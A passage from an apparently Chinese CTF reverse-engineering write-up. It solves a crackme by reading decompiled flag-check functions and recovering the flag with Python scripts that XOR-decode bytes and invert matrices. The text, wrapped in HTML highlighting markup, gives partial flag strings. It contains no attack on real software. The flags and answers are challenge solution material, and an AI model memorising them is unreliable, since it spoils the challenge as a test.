class="token punctuation">)</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="8"></td><td><pre>        b<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    <span class="token keyword">else</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="10"></td><td><pre>        b<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="12"></td><td><pre>c<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token keyword">for</span> i<span class="token punctuation">,</span>x <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>b<span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    c<span class="token punctuation">.</span>append<span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token operator">^</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>s<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>c<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span></pre></td></tr></table></figure><p>结果为 <code>1E7_US_drAW_a_plC7ur3_WITH_MA7Rix_4nd</code></p><p>代码 24 行之后限定了 flag 的 37 位之后的格式</p><p>得到 flag 为 <code>1E7_US_drAW_a_plC7ur3_WITH_MA7Rix_4nd_aaaaa_aaaaa_aaaaa</code> ，其中 a 为未知</p><h3 id="sub_24bd"><a class="anchor" href="#sub_24bd">#</a> sub_24BD</h3><figure class="highlight c"><figcaption data-lang="c"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="3"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="5"></td><td><pre>        dword_83C0<span class="token punctuation">[</span><span class="token number">17</span> <span class="token operator">*</span> i <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="6"></td><td><pre>        <span class="token keyword">for</span> <span class="token punctuation">(</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;=</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>k <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>            dword_83C0<span class="token punctuation">[</span><span class="token number">17</span> <span class="token operator">*</span> i <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">+=</span> byte_8020<span class="token punctuation">[</span><span class="token number">55</span> <span class="token operator">*</span> i <span class="token operator">+</span> k<span class="token punctuation">]</span> <span class="token operator">*</span> dword_6060<span class="token punctuation">[</span><span class="token number">17</span> <span class="token operator">*</span> k <span class="token operator">+</span> j<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">memcmp</span><span class="token punctuation">(</span>dword_83C0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_6500<span class="token punctuation">,</span> <span class="token number">0x154uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="11"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token keyword">for</span> <span class="token punctuation">(</span> m <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> m <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>m <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="14"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n <span class="token operator">&lt;=</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>n <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="16"></td><td><pre>        dword_83C0<span class="token punctuation">[</span><span class="token number">17</span> <span class="token operator">*</span> m <span class="token operator">+</span> n<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="17"></td><td><pre>        <span class="token keyword">for</span> <span class="token punctuation">(</span> ii <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> ii <span class="token operator">&lt;=</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>ii <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="18"></td><td><pre>            dword_83C0<span class="token punctuation">[</span><span class="token number">17</span> <span class="token operator">*</span> m <span class="token operator">+</span> n<span class="token punctuation">]</span> <span class="token operator">+=</span> byte_8020<span class="token punctuation">[</span><span class="token number">55</span> <span class="token operator">*</span> m <span class="token operator">+</span> <span class="token number">275</span> <span class="token operator">+</span> ii<span class="token punctuation">]</span> <span class="token operator">*</span> dword_6660<span class="token punctuation">[</span><span class="token number">17</span> <span class="token operator">*</span> ii <span class="token operator">+</span> n<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="19"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">memcmp</span><span class="token punctuation">(</span>dword_83C0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_6B00<span class="token punctuation">,</span> <span class="token number">0x154uLL</span><span class="token punctuation">)</span> <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre>    <span class="token keyword">return</span> <span class="token number">1LL</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token keyword">for</span> <span class="token punctuation">(</span> jj <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> jj <span class="token operator">&lt;=</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token operator">++</span>jj <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="25"></td><td><pre>    <span class="token keyword">for</span> <span class="token punctuation">(</span> kk <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> kk <span class="token operator">&lt;=</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>kk <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>    <span class="token punctuation">&#123;</span></pre></td></tr><tr><td data-num="27"></td><td><pre>        dword_83C0<span class="token punctuation">[</span><span class="token number">17</span> <span class="token operator">*</span> jj <span class="token operator">+</span> kk<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="28"></td><td><pre>        <span class="token keyword">for</span> <span class="token punctuation">(</span> mm <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> mm <span class="token operator">&lt;=</span> <span class="token number">16</span><span class="token punctuation">;</span> <span class="token operator">++</span>mm <span class="token punctuation">)</span></pre></td></tr><tr><td data-num="29"></td><td><pre>            dword_83C0<span class="token punctuation">[</span><span class="token number">17</span> <span class="token operator">*</span> jj <span class="token operator">+</span> kk<span class="token punctuation">]</span> <span class="token operator">+=</span> byte_8020<span class="token punctuation">[</span><span class="token number">55</span> <span class="token operator">*</span> jj <span class="token operator">+</span> <span class="token number">550</span> <span class="token operator">+</span> mm<span class="token punctuation">]</span> <span class="token operator">*</span> dword_6C60<span class="token punctuation">[</span><span class="token number">17</span> <span class="token operator">*</span> mm <span class="token operator">+</span> kk<span class="token punctuation">]</span><span class="token punctuation">;</span></pre></td></tr><tr><td data-num="30"></td><td><pre>    <span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token punctuation">&#125;</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token keyword">return</span> <span class="token function">memcmp</span><span class="token punctuation">(</span>dword_83C0<span class="token punctuation">,</span> <span class="token operator">&amp;</span>unk_7100<span class="token punctuation">,</span> <span class="token number">0x154uLL</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">;</span></pre></td></tr></table></figure><p>以第一组 for 循环为例，实际上是将 byte_8020 的前五行和 dword_6060 进行矩阵乘法，将结果和 unk_6500 对比</p><p>dword_6060 和 unk_6500 的数据可以在内存中找到，进行一个矩阵的逆运算，就能求出 byte_8020 的前五行</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre><span class="token keyword">from</span> data <span class="token keyword">import</span> x6500<span class="token punctuation">,</span> x6060</pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token keyword">import</span> numpy <span class="token keyword">as</span> np</pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token keyword">def</span> <span class="token function">hex_to_arr</span><span class="token punctuation">(</span>hex_str<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="4"></td><td><pre>    hex_str <span class="token operator">=</span> hex_str<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="5"></td><td><pre>    hex_str <span class="token operator">=</span> hex_str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="6"></td><td><pre>    hex_str <span class="token operator">=</span> hex_str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\r'</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="7"></td><td><pre>    hex_str <span class="token operator">=</span> hex_str<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'  '</span><span class="token punctuation">,</span> <span class="token string">' '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="8"></td><td><pre>    hex_str <span class="token operator">=</span> hex_str<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="9"></td><td><pre>    hex_str <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">int</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> hex_str<span class="token punctuation">]</span></pre></td></tr><tr><td data-num="10"></td><td><pre>    <span class="token keyword">return</span> hex_str</pre></td></tr><tr><td data-num="11"></td><td><pre></pre></td></tr><tr><td data-num="12"></td><td><pre>x6500 <span class="token operator">=</span> hex_to_arr<span class="token punctuation">(</span>x6500<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token comment">#print(len(x6500))</span></pre></td></tr><tr><td data-num="14"></td><td><pre>x6060 <span class="token operator">=</span> hex_to_arr<span class="token punctuation">(</span>x6060<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token comment">#print(len(x6060))</span></pre></td></tr><tr><td data-num="16"></td><td><pre>d65 <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="18"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="19"></td><td><pre>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="20"></td><td><pre>            d65<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+=</span> x6500<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">17</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>j<span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>k<span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">256</span><span class="token operator">**</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="21"></td><td><pre>d60 <span class="token operator">=</span> np<span class="token punctuation">.</span>zeros<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">,</span> <span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="23"></td><td><pre>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="24"></td><td><pre>        <span class="token keyword">for</span> k <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span></pre></td></tr><tr><td data-num="25"></td><td><pre>            d60<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+=</span> x6060<span class="token punctuation">[</span>i<span class="token operator">*</span><span class="token number">17</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>j<span class="token operator">*</span><span class="token number">4</span><span class="token operator">+</span>k<span class="token punctuation">]</span><span class="token operator">*</span><span class="token number">256</span><span class="token operator">**</span><span class="token punctuation">(</span>k<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="26"></td><td><pre>d60_inv <span class="token operator">=</span> np<span class="token punctuation">.</span>linalg<span class="token punctuation">.</span>inv<span class="token punctuation">(</span>d60<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="27"></td><td><pre>d80 <span class="token operator">=</span> np<span class="token punctuation">.</span>dot<span class="token punctuation">(</span>d65<span class="token punctuation">,</span> d60_inv<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="28"></td><td><pre><span class="token keyword">print</span><span class="token punctuation">(</span>d80<span class="token punctuation">)</span></pre></td></tr></table></figure><p>结果为</p><pre><code>[[32. 32. 49. 49. 32. 32. 32. 32. 32. 32. 32. 32. 32. 32. 49. 49. 49.]
 [32. 32. 49. 49. 49. 49. 32. 32. 49. 49. 32. 32. 32. 32. 49. 49. 32.]
 [32. 32. 49. 49. 49. 49. 32. 32. 49. 49. 32. 32. 49. 49. 32. 32. 32.]
 [49. 49. 49. 49. 49. 49. 49. 49. 49. 49. 32. 32. 49. 49. 32. 32. 32.]
 [32. 32. 49. 49. 49. 49. 49. 49. 49. 49. 32. 32. 49. 49. 32. 32. 32.]]
</code></pre><p>同样的方法，可以得到 byte_8020 的后 10 行</p><h3 id="sub_1483"><a class="anchor" href="#sub_1483">#</a> sub_1483</h3><p>代码的逻辑大致是根据输入的 flag 的后 17 位，构造 byte_8020</p><p>刚才已经求出了 byte_8020，可以用下面的脚本求出 flag 后 17 位</p><figure class="highlight python"><figcaption data-lang="python"></figcaption><table><tr><td data-num="1"></td><td><pre>small_alpha_bet <span class="token operator">=</span> <span class="token punctuation">[</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token string">'      11    11    111111111111111111    11    11       '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token string">'           111  1119911191119                          '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="4"></td><td><pre><span class="token string">'          11  11111111119999991111111111  11           '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="5"></td><td><pre><span class="token string">'  9   9111        9        111  9   99      9   111    '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="6"></td><td><pre><span class="token string">'            111111111199111111991111111111             '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="7"></td><td><pre><span class="token string">'111  9  9111  1111119111111   111         111  9       '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="8"></td><td><pre><span class="token string">'99111  111      9           111111  111  111         11'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="9"></td><td><pre><span class="token string">'   111     9   111      1119            111   111  111 '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="10"></td><td><pre><span class="token string">'   9         111111      9      9      111  99111   111'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="11"></td><td><pre><span class="token string">'   111     91111119     111         1119111   1119     '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="12"></td><td><pre><span class="token string">'    111         111   9  111      1119     111        1'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="13"></td><td><pre><span class="token string">'        111   11191119    111   991119  111            '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="14"></td><td><pre><span class="token string">'     9111111111              111      9111   111   1119'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="15"></td><td><pre><span class="token string">'1119  111111   111        111111111        9111  99111 '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="16"></td><td><pre><span class="token string">'                        1119        111111   111  111  '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="17"></td><td><pre><span class="token string">'999     111111        1119  111  11199   9        91119'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="18"></td><td><pre><span class="token string">'111        111      9     9111     1119  99   111111111'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="19"></td><td><pre><span class="token string">'        11    11111111111111111111111111    11         '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="20"></td><td><pre><span class="token string">'          11  11                      11  11           '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="21"></td><td><pre><span class="token string">'   99111     111111     111   111  9       111      9  '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="22"></td><td><pre><span class="token string">'        1111119  111111   111              9    111    '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="23"></td><td><pre><span class="token string">'   111      11191111119   111  99        111111   11111'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="24"></td><td><pre><span class="token string">'             111   111     11199           9     991111'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="25"></td><td><pre><span class="token string">'        9111      111      111111      9   99     111  '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="26"></td><td><pre><span class="token string">'9   9      1111119  1119111      111  11111199       11'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="27"></td><td><pre><span class="token string">'        9   111111111     111111111      9111111    111'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="28"></td><td><pre></pre></td></tr><tr><td data-num="29"></td><td><pre>upper_alpha_bet <span class="token operator">=</span> <span class="token punctuation">[</span></pre></td></tr><tr><td data-num="30"></td><td><pre><span class="token string">'                   111111  99      111  111111111111111'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="31"></td><td><pre><span class="token string">'      11  11    11                  11    11  11       '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="32"></td><td><pre><span class="token string">'  111     9  111      11199111111              11111111'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="33"></td><td><pre><span class="token string">'  11111111  11      1199  11  1199      11  11111111111'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="34"></td><td><pre><span class="token string">'1111111111119   999          111      9  9      111    '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="35"></td><td><pre><span class="token string">'111     99   9111                9111111           1119'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="36"></td><td><pre><span class="token string">'     11111199111111        111111111      111  9111   1'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="37"></td><td><pre><span class="token string">'      11  111111        111111        111111  111      '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="38"></td><td><pre><span class="token string">'        11111111111111111111111111111111111111         '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="39"></td><td><pre><span class="token string">'       1119        111     111   9      111            '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="40"></td><td><pre><span class="token string">'111   111         9      11199111      1119111         '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="41"></td><td><pre><span class="token string">'     111        999   111111111         99     1119111 '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="42"></td><td><pre><span class="token string">'  11          11111111      11111111          11    111'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="43"></td><td><pre><span class="token string">'1111111111  11            11            11  11111111111'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="44"></td><td><pre><span class="token string">'  1111  11    11        11  11        11    11  1111111'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="45"></td><td><pre><span class="token string">'111   9           111111           1119111111   9      '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="46"></td><td><pre><span class="token string">'9111        11111191111111111119   111         111     '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="47"></td><td><pre><span class="token string">'  9111    111111   111   9           111111   111111   '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="48"></td><td><pre><span class="token string">'9111   911199     111111           9     9         9111'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="49"></td><td><pre><span class="token string">'       111   111  9  9   99   1111119      111        1'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="50"></td><td><pre><span class="token string">'  1111  11  11            11            11  11  1111111'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="51"></td><td><pre><span class="token string">'111        111  111111111        111111111           11'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="52"></td><td><pre><span class="token string">'    1111    11      9999  11  9999      1111  11111    '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="53"></td><td><pre><span class="token string">'111111     1119111       9      99111   1111119111     '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="54"></td><td><pre><span class="token string">'111     9   9   111        1119  111      1111111119111'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="55"></td><td><pre><span class="token string">'  111     111111111111         1119   111111   1111119 '</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="56"></td><td><pre></pre></td></tr><tr><td data-num="57"></td><td><pre></pre></td></tr><tr><td data-num="58"></td><td><pre>num_bet <span class="token operator">=</span> <span class="token punctuation">[</span></pre></td></tr><tr><td data-num="59"></td><td><pre><span class="token string">'111  9   111     99  111111   111           111     111'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="60"></td><td><pre><span class="token string">'   111   111111      111     9111   111   1111119111  1'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="61"></td><td><pre><span class="token string">'             9   9   9111111  9      111111111     111 '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="62"></td><td><pre><span class="token string">'111       9111111111   111   111        1111111119  911'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="63"></td><td><pre><span class="token string">'99  9111        1119        1119  111        1119     9'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="64"></td><td><pre><span class="token string">'   9   111111   9111   9111111111                  9  1'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="65"></td><td><pre><span class="token string">'     111   111   111  111111              9     9111111'</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="66"></td><td><pre><span class="token string">'          1111111111111111111111111111111111           '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="67"></td><td><pre><span class="token string">'       9      111111     9    1111111111111119         '</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="68"></td><td><pre><span class="token string">'111   111111999111111  9   9111     111   9111        1'</span><span class="token punctuation">]</span></pre></td></tr><tr><td data-num="69"></td><td><pre></pre></td></tr><tr><td data-num="70"></td><td><pre>matrix_8020 <span class="token operator">=</span> <span class="token punctuation">[</span></pre></td></tr><tr><td data-num="71"></td><td><pre><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="72"></td><td><pre><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="73"></td><td><pre><span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">,</span></pre></td></tr><tr><td data-num="74"></td><td><pre><span class="token punctuation">[</span><span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> <span class="token number">49</span><span class="token 